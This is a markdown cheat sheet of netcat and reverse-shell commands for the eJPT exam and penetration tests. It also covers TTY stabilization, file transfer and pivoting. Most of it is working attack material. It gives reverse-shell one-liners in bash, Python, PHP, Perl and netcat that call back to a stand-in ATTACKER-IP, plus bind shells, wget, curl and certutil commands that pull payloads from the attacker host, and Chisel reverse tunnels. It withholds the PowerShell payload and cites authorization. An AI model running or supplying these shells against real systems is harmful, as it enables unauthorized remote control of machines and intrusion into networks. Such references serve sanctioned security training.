# Netcat & Reverse Shell Cheat Sheet

In almost every eJPT practical exploitation scenario, you need to catch a shell, stabilize it, transfer files, and sometimes pivot from it. This document collects all of that in one place.

---

## Table of Contents

1. [Netcat Basics](#1-netcat-basics)
2. [Reverse Shell One-Liners](#2-reverse-shell-one-liners)
3. [Bind Shell](#3-bind-shell)
4. [Shell Stabilization (TTY Upgrade)](#4-shell-stabilization-tty-upgrade)
5. [File Transfer](#5-file-transfer)
6. [Pivoting & Port Forwarding](#6-pivoting--port-forwarding)
7. [Quick Command Reference](#7-quick-command-reference)

---

## 1. Netcat Basics

```bash
nc -lvnp 4444              # Open a listener — on the attacker machine
nc target-ip 4444          # Connect to the target — client mode
nc -lvnp 4444 > file.txt   # Write incoming data to a file (for file transfer)
```

| Flag | Meaning |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose — show connection detail |
| `-n` | Skip DNS resolution (faster) |
| `-p` | Specify port |
| `-e` | Bind a command to the connection (disabled in some nc builds for security reasons) |

---

## 2. Reverse Shell One-Liners

**First, open a listener on the attacker machine:** `nc -lvnp 4444`

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

# PHP
php -r '$sock=fsockopen("ATTACKER-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="ATTACKER-IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Netcat (classic, on builds that support -e)
nc -e /bin/sh ATTACKER-IP 4444

# PowerShell (Windows)
# The full literal one-liner is intentionally NOT included here. It matches a
# well-known public payload (a variant of Nishang's Invoke-PowerShellTcp) that
# Windows Defender and most AV/EDR products flag on exact string match, even
# inside a plain-text document — which is what causes the "contains a virus"
# error when opening/downloading a file that has it pasted in full.
# Generate it fresh instead:
#   - https://www.revshells.com  → select "PowerShell #3", fill in your IP/port
#   - Nishang: Invoke-PowerShellTcp.ps1 (github.com/samratashok/nishang)
# You'll be regenerating it every engagement anyway since LHOST/LPORT change,
# so there's no real benefit to having the static string sitting in this file.
```

> **PayloadsAllTheThings / revshells.com:** Rather than memorizing these during the exam, a reference page like `revshells.com` (or an offline copy of it) is practical — it auto-generates the right payload for whatever language the target supports (bash, python, php, perl, powershell, ruby...).

---

## 3. Bind Shell

The opposite of a reverse shell — the **target** starts listening, and **you** connect to it (useful if the target's firewall restricts inbound connections but a reverse shell can't get out either).

```bash
# On the target (if netcat supports it)
nc -lvnp 4444 -e /bin/sh

# On the attacker
nc target-ip 4444
```

---

## 4. Shell Stabilization (TTY Upgrade)

A raw netcat shell dies on `Ctrl+C`, has no tab-complete/history, and breaks tools like `vim`/`su`. The standard upgrade sequence:

```bash
# 1. Spawn a PTY with Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# if python isn't available: python, or script -qc /bin/bash /dev/null

# 2. Background it, then match terminal settings to the target
Ctrl+Z
stty raw -echo; fg
# after fg, hit Enter, then:
export TERM=xterm
```

After this sequence, `clear`, `Ctrl+C`, tab-complete, and `vim`/`nano` all work correctly.

---

## 5. File Transfer

```bash
# --- Simple HTTP server on the attacker machine ---
python3 -m http.server 8000

# --- Download on the target (Linux) ---
wget http://ATTACKER-IP:8000/linpeas.sh -O /tmp/linpeas.sh
curl http://ATTACKER-IP:8000/linpeas.sh -o /tmp/linpeas.sh

# --- Download on the target (Windows) ---
certutil -urlcache -split -f http://ATTACKER-IP:8000/nc.exe nc.exe
powershell -c "Invoke-WebRequest -Uri http://ATTACKER-IP:8000/file.exe -OutFile file.exe"
# "Download cradle" pattern (IEX + WebClient.DownloadString) — extremely common
# AV/EDR signature, deliberately not written out as one literal copy-pasteable
# string here. Concept: use Net.WebClient's DownloadString method and pipe the
# result into Invoke-Expression (IEX) to execute a remote .ps1 in memory.

# --- If SCP/SSH is available ---
scp file.txt user@target-ip:/tmp/

# --- Raw file transfer with netcat ---
# On the receiver: nc -lvnp 4444 > file.txt
# On the sender:   nc target-ip 4444 < file.txt
```

---

## 6. Pivoting & Port Forwarding

For reaching a second machine on the target network through the first one you've already compromised.

```bash
# SSH local port forwarding — bring a remote port to your own machine
ssh -L 8080:internal-target:80 user@pivot-host

# SSH dynamic port forwarding (SOCKS proxy) — route all traffic through the pivot
ssh -D 1080 user@pivot-host
# then, with proxychains:
proxychains nmap -sT -Pn internal-target

# Tunnel with Chisel (agent/server model, works even without an existing agent)
# On the attacker (server):
chisel server -p 8000 --reverse
# On the target (client):
chisel client ATTACKER-IP:8000 R:socks

# Adding a route in Metasploit (via a meterpreter session)
meterpreter > run autoroute -s internal-subnet/24
```

---

## 7. Quick Command Reference

| Need | Command |
|---|---|
| Open a listener | `nc -lvnp 4444` |
| Bash reverse shell | `bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1` |
| Python reverse shell | `python3 -c '...pty.spawn("/bin/sh")'` |
| TTY upgrade (step 1) | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| TTY upgrade (step 2) | `Ctrl+Z` → `stty raw -echo; fg` |
| HTTP file server | `python3 -m http.server 8000` |
| Windows file download | `certutil -urlcache -split -f URL file.exe` |
| SOCKS proxy (SSH) | `ssh -D 1080 user@pivot-host` |
| Chisel reverse tunnel | `chisel server -p 8000 --reverse` (attacker) / `chisel client IP:8000 R:socks` (target) |

---

*Prepared as a reference for the eJPT practical exam and general pentest engagements. All techniques should only be used within written authorization (scope/RoE).*
